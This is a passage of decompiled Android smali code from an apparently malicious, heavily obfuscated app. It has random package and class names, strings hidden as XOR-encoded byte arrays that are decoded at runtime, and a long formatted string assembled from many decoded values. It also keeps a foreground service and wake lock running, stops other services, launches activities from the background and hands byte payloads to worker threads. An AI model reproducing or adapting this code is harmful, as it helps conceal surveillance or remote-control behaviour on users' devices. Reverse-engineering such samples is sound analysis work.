    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v4, 0x5

    new-array v10, v4, [B

    fill-array-data v10, :array_1e

    move-object/from16 v21, v1

    const/16 v4, 0x8

    new-array v1, v4, [B

    fill-array-data v1, :array_1f

    invoke-static {v10, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v4, 0x5

    new-array v10, v4, [B

    fill-array-data v10, :array_20

    move-object/from16 v22, v1

    const/16 v4, 0x8

    new-array v1, v4, [B

    fill-array-data v1, :array_21

    invoke-static {v10, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v4, 0x5

    new-array v4, v4, [B

    fill-array-data v4, :array_22

    move-object/from16 v23, v1

    const/16 v10, 0x8

    new-array v1, v10, [B

    fill-array-data v1, :array_23

    invoke-static {v4, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0x11e

    new-array v1, v1, [B

    fill-array-data v1, :array_24

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_25

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    move-object v10, v2

    move-object/from16 v16, v17

    move-object/from16 v17, v18

    move-object/from16 v18, v19

    move-object/from16 v19, v20

    move-object/from16 v20, v21

    move-object/from16 v21, v22

    move-object/from16 v22, v23

    move-object/from16 v23, v0

    filled-new-array/range {v5 .. v23}, [Ljava/lang/Object;

    move-result-object v0

    invoke-static {v1, v0}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    move-object/from16 v2, v24

    invoke-static {v1, v2, v0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->C(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->p([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_26

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_27

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v0, v2}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->k(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x58t
        0x5bt
        0x1t
    .end array-data

    :array_1
    .array-data 1
        0x39t
        0x28t
        0x65t
        -0x4dt
        0x17t
        -0x48t
        0x1at
        -0x4t
    .end array-data

    :array_2
    .array-data 1
        -0x2bt
        -0x46t
        -0x73t
        0x75t
        0x0t
        -0x69t
        0x4t
        0x43t
        -0x3dt
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x4ct
        -0x2at
        -0x1ct
        0x5t
        0x61t
        -0x12t
        0x6at
        0x26t
    .end array-data

    :array_4
    .array-data 1
        0x32t
        -0x76t
        0x4dt
        0x2ft
        0x43t
        0x32t
        0x66t
        -0x45t
        0x32t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x45t
        -0x11t
        0x2et
        0x5ft
        0x22t
        0x4bt
        0x8t
        -0x22t
    .end array-data

    :array_6
    .array-data 1
        0x2ct
        -0x2bt
        -0x4et
        -0x20t
        -0x6dt
        0x3at
    .end array-data

    nop

    :array_7
    .array-data 1
        0x55t
        -0x60t
        -0x24t
        -0x72t
        -0xat
        0x4dt
        -0x75t
        -0x5at
    .end array-data

    :array_8
    .array-data 1
        -0x36t
        -0x18t
        -0x3bt
        -0x28t
        -0x5bt
        0x0t
        0x40t
    .end array-data

    :array_9
    .array-data 1
        -0x60t
        -0x7ft
        -0x5ct
        -0x4at
        -0x35t
        0x65t
        0x37t
        -0x62t
    .end array-data

    :array_a
    .array-data 1
        -0x3dt
        -0x61t
        -0x33t
        -0x3dt
        -0x72t
        0x4bt
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x46t
        -0x10t
        -0x48t
        -0x53t
        -0x15t
        0x3ct
        -0x4dt
        0x6dt
    .end array-data

    :array_c
    .array-data 1
        0x48t
        0x51t
        0x3ct
        0x10t
        0x57t
        -0xft
        0x6bt
    .end array-data

    :array_d
    .array-data 1
        0x26t
        0x3et
        0x52t
        0x77t
        0x39t
        -0x6ct
        0x1ct
        0x7bt
    .end array-data

    :array_e
    .array-data 1
        0x23t
        -0x19t
        0xct
        -0x2dt
        -0x57t
        -0x68t
        -0x39t
        0x75t
    .end array-data

    :array_f
    .array-data 1
        0x59t
        -0x71t
        0x63t
        -0x43t
        -0x32t
        -0xat
        -0x5et
        0x2t
    .end array-data

    :array_10
    .array-data 1
        -0x69t
        -0xdt
        0x29t
        0x63t
        0x50t
        0x22t
        -0x60t
    .end array-data

    :array_11
    .array-data 1
        -0x10t
        -0x64t
        0x47t
        0x4t
        0x3et
        0x47t
        -0x29t
        -0x5dt
    .end array-data

    :array_12
    .array-data 1
        0x6ft
        0x1at
        0x41t
        -0x67t
        -0x5et
        0x1ft
        -0x35t
    .end array-data

    :array_13
    .array-data 1
        0x15t
        0x72t
        0x20t
        -0xat
        -0x34t
        0x7at
        -0x44t
        0x3t
    .end array-data

    :array_14
    .array-data 1
        0x18t
        -0x78t
        -0x6bt
        -0x7bt
        0x3at
        -0x68t
        -0x1ct
    .end array-data

    :array_15
    .array-data 1
        0x7ft
        -0x8t
        -0xct
        -0x4t
        0x54t
        -0x3t
        -0x6dt
        -0x5bt
    .end array-data

    :array_16
    .array-data 1
        -0x5at
        0x5bt
        -0x20t
        0x18t
        -0x73t
        -0x12t
        0x51t
        -0x45t
        -0x4dt
        0x44t
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x2at
        0x33t
        -0x71t
        0x76t
        -0x18t
        -0x62t
        0x34t
        -0x2bt
    .end array-data

    :array_18
    .array-data 1
        -0x6et
        -0x5dt
        -0x3dt
        -0x6bt
        -0x76t
        -0x27t
    .end array-data

    nop

    :array_19
    .array-data 1
        -0xdt
        -0x33t
        -0x5et
        -0x5t
        -0x11t
        -0x52t
        0x3t
        -0x1dt
    .end array-data

    :array_1a
    .array-data 1
        0x4dt
        0x3ct
        0x13t
        -0x2et
        0xat
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x20t
        0x5et
        0x7dt
        -0x49t
        0x7dt
        0x2ft
        -0x7ft
        0x58t
    .end array-data

    :array_1c
    .array-data 1
        0x77t
        -0x53t
        0x18t
        0x19t
        0x2ft
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x15t
        -0x32t
        0x76t
        0x7ct
        0x58t
        0x48t
        0x2bt
        0x3ft
    .end array-data

    :array_1e
    .array-data 1
        0x3et
        0x30t
        0x7et
        -0x40t
        0x44t
    .end array-data

    nop

    :array_1f
    .array-data 1
        0x4at
        0x47t
        0xet
        -0x49t
        0x20t
        -0x31t
        0x11t
        -0x42t
    .end array-data

    :array_20
    .array-data 1
        -0x3et
        -0x46t
        -0x20t
        -0x4bt
        -0x2ct
    .end array-data

    nop

    :array_21
    .array-data 1
        -0x4et
        -0x25t
        -0x67t
        -0x3ft
        -0x5ct
        -0x3ft
        -0x69t
        0x8t
    .end array-data

    :array_22
    .array-data 1
        -0x42t
        0x51t
        -0x50t
        0x15t
        -0x9t
    .end array-data

    nop

    :array_23
    .array-data 1
        -0x32t
        0x30t
        -0x37t
        0x7ct
        -0x66t
        0x51t
        0x70t
        -0x77t
    .end array-data

    :array_24
    .array-data 1
        0x31t
        0xat
        -0x3et
        -0x28t
        0x71t
        -0x22t
        0x5t
        0x6et
        0x51t
        0x64t
        -0x17t
        -0x41t
        -0x29t
        0x44t
        -0x3bt
        -0x4et
        -0x9t
        0x6at
        -0x25t
        -0x53t
        0x4t
        -0x2bt
        0x5ct
        0x24t
        0x78t
        0x5t
        -0x52t
        -0x62t
        0x6ct
        0x5et
        -0x40t
        -0x1ct
        -0x5ct
        -0x5dt
        0x8t
        0x52t
        -0x7ct
        0x14t
        -0x7ft
        -0x48t
        0x32t
        0x2ct
        -0x31t
        -0x27t
        0x4dt
        -0x1bt
        -0x26t
        -0x1ft
        -0xet
        -0x10t
        0x69t
        0x69t
        -0x78t
        0x7t
        -0x78t
        -0x60t
        -0x5dt
        0x66t
        -0x1at
        -0x48t
        0xat
        -0x3ct
        0x61t
        -0x5t
        -0x9t
        -0x5at
        0x3at
        0x1et
        0x9t
        -0x22t
        0x71t
        0x24t
        0x78t
        0x5t
        -0x52t
        -0x62t
        0x6ct
        0x5et
        -0x40t
        -0x1ct
        -0x5ct
        -0x5dt
        -0x54t
        -0x7bt
        0x57t
        -0x7ft
        0x4ft
        0x47t
        0x30t
        0x23t
        -0x38t
        0x4t
        -0x33t
        0x41t
        -0x6dt
        -0x1ft
        0x3et
        0x1t
        -0x19t
        -0x25t
        0x42t
        -0x1et
        0x7t
        0x61t
        0x56t
        -0x47t
        0x69t
        0x1bt
        -0x62t
        0x44t
        0x5t
        0x47t
        0x4bt
        0x66t
        -0x1at
        -0x48t
        0xat
        -0x3ct
        0x61t
        -0x5t
        -0x9t
        -0x5at
        0x3at
        0x1et
        0x9t
        -0x24t
        0x4dt
        0x24t
        0x78t
        0x5t
        -0x52t
        -0x62t
        0x6ct
        0x5et
        -0x40t
        -0x1ct
        -0x5ct
        -0x5dt
        -0x54t
        -0x77t
        0x48t
        -0x7ft
        0x4ft
        0x47t
        0x30t
        0x23t
        -0x38t
        0x4t
        -0x33t
        0x41t
        -0x6dt
        -0x1ft
        0x31t
        0x8t
        -0x2et
        -0x25t
        0x42t
        -0x1et
        0x7t
        0x61t
        0x56t
        -0x47t
        0x69t
        0x1bt
        -0x62t
        0x44t
        -0x79t
        -0x4ft
        0x32t
        0x2ct
        -0x31t
        -0x27t
        0x4dt
        -0x1bt
        -0x26t
        -0x1ft
        -0xet
        -0x10t
        0x69t
        0x4et
        -0x78t
        -0x7ft
        0x4ft
        0x47t
        0x30t
        0x23t
        -0x38t
        0x4t
        -0x33t
        0x41t
        -0x6dt
        -0x1ft
        -0x4at
        -0x13t
        -0x54t
        -0x6ft
        0x6bt
        -0x7dt
        0x40t
        0x40t
        -0x13t
        -0x5dt
        0x6ct
        0x4dt
        -0x33t
        0x9t
        -0x7et
        0x24t
        0x78t
        0x5t
        -0x52t
        -0x62t
        0x6ct
        0x5et
        -0x40t
        -0x1ct
        -0x5ct
        -0x5dt
        0x2bt
        0x5dt
        0x8t
        -0x35t
        0x66t
        0x26t
        0x77t
        0x2t
        0x73t
        0x1et
        -0x38t
        0x17t
        -0x40t
        -0x6bt
        -0x5bt
        -0xat
        0x3at
        0x4at
        0x8t
        -0x35t
        0x66t
        0x26t
        0x77t
        0x2t
        0x73t
        0x1et
        -0x38t
        0x17t
        -0x40t
        -0x78t
        -0x46t
        -0x9t
        0x26t
        0x55t
        -0x78t
        0xat
        0x5t
        0x6et
        0x51t
        0x64t
        -0x17t
        -0x41t
        -0x29t
        0x44t
        -0x3bt
        -0x4et
        -0x9t
        -0x29t
        0x26t
        0x55t
        -0x78t
        0xat
        -0x70t
        -0x52t
        -0x4ct
        -0x18t
        0x2ct
        0x4at
        0x8t
        -0x35t
        0x66t
        0x26t
        0x77t
        0x2t
        0x73t
        0x1et
        -0x38t
        0x17t
    .end array-data

    nop

    :array_25
    .array-data 1
        -0x29t
        -0x7dt
        0x49t
        0x3et
        -0x13t
        0x64t
        -0x20t
        -0x3ft
    .end array-data

    :array_26
    .array-data 1
        0x68t
        0x4at
        -0x25t
        -0x59t
    .end array-data

    :array_27
    .array-data 1
        0x18t
        0x23t
        -0x4bt
        -0x40t
        0x64t
        0x79t
        0x2t
        0x7ct
    .end array-data
.end method

.method public static E(Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->h:Ljava/lang/Object;

    monitor-enter v0

    :try_start_0
    invoke-static {p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->d(Ljava/lang/String;)V

    monitor-exit v0

    return-void

    :catchall_0
    move-exception p0

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw p0
.end method

.method private F(Landroid/content/Context;)V
    .locals 2

    .line 1
    :try_start_0
    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->b(Landroid/content/Context;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;

    move-result-object v0

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    if-nez p1, :cond_0

    new-instance p1, Landroid/app/Notification;

    invoke-direct {p1}, Landroid/app/Notification;-><init>()V

    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_1

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    const/high16 v1, 0x40000000    # 2.0f

    invoke-static {p0, v0, p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/kr;->a(Lcom/vknnolqo/p9sv5zvf/CtKus0KT;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_1
    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, p1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method

.method private G(Ljava/lang/Class;)V
    .locals 2

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-static {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-direct {v0, v1, p1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object p1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-virtual {p1, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    :cond_0
    return-void
.end method

.method private H()V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->t:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->r(Landroid/content/Context;)V

    :cond_0
    return-void
.end method

.method private I()V
    .locals 1

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->a:Z

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->f()V

    :cond_0
    return-void
.end method

.method private J()V
    .locals 5

    .line 1
    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->W:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const-class v3, Lcom/vknnolqo/p9sv5zvf/R2nsO1AJ;

    invoke-direct {v0, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_2

    new-array v4, v1, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v3, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    return-void

    nop

    :array_0
    .array-data 1
        0x22t
        0x2t
        -0x1ft
        -0x21t
    .end array-data

    :array_1
    .array-data 1
        0x56t
        0x70t
        -0x6ct
        -0x46t
        0x13t
        -0x1t
        0x5bt
        0x2et
    .end array-data

    :array_2
    .array-data 1
        0x9t
        -0x50t
        -0x72t
    .end array-data

    :array_3
    .array-data 1
        0x4at
        -0x1t
        -0x3dt
        0xft
        -0x68t
        -0x6dt
        0x8t
        0x1et
    .end array-data

    :array_4
    .array-data 1
        0xdt
        -0x5bt
        0x66t
    .end array-data

    :array_5
    .array-data 1
        0x42t
        -0x1dt
        0x20t
        0x50t
        0x4ct
        0x75t
        0x16t
        0x10t
    .end array-data
.end method

.method private K()V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->s:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/DnVSEOyK;->q(Landroid/content/Context;)V

    :cond_0
    return-void
.end method

.method public static synthetic a([BLandroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->x([BLandroid/content/Context;)V

    return-void
.end method

.method public static synthetic b([BLandroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->y([BLandroid/content/Context;)V

    return-void
.end method

.method public static synthetic c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2, p3}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->A(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic d(Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->w(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic e(Lcom/vknnolqo/p9sv5zvf/CtKus0KT;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->n()V

    return-void
.end method

.method public static synthetic f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->z(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method static g()V
    .locals 1

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->i:Z

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->e(Z)V

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->j:Z

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->e:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_0

    :try_start_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->e:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->j:Z
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_0
    :goto_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->a()V

    return-void
.end method

.method public static h(Landroid/content/Context;Ljava/lang/String;)V
    .locals 2

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->g:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nr;

    invoke-direct {v1, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nr;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    return-void
.end method

.method public static i(Landroid/content/Context;[B)V
    .locals 2

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->g:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qr;

    invoke-direct {v1, p1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qr;-><init>([BLandroid/content/Context;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    return-void
.end method

.method public static j(Landroid/content/Context;[B)V
    .locals 2

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->g:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pr;

    invoke-direct {v1, p1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/pr;-><init>([BLandroid/content/Context;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    return-void
.end method

.method public static k(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .line 1
